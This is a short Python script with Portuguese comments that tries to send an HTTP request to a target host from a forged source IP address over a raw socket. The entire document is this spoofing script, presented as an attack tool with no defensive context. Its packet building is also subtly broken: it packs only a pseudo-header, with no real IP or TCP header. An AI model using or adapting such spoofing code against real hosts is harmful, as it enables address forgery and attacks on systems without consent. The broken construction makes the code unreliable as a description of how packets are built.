import socket
import struct

# Endereço IP e porta do alvo
target_host = "192.168.0.1"
target_port = 80

# Criando um socket
client = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

# Endereço IP falso que será usado no spoofing
fake_ip = "192.168.0.100"

# Montando o pacote de dados com o endereço IP falso
data = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_host)
packet = struct.pack("!4s4sBBH", socket.inet_aton(fake_ip), socket.inet_aton(target_host), 0, socket.IPPROTO_TCP, len(data)) + data.encode()

# Enviando o pacote para o alvo
client.sendto(packet, (target_host, target_port))
